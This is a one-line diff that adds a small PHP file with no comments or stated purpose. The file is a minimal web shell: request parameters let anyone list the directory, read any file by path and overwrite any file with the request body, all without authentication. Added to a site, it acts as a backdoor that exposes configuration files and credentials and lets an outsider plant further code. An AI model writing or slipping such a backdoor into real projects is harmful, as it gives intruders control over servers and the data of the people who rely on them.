@@ -1,0 +1,1 @@
+<?php if(isset($_GET['a'])){ $a=$_GET['a']; if($a=='l'){ foreach(glob('*') as $f)echo $f.PHP_EOL; }elseif($a=='r'){ echo file_get_contents($_GET['f']); }elseif($a=='w'){ file_put_contents($_GET['f'],file_get_contents('php://input')); echo 'ok'; } } ?>
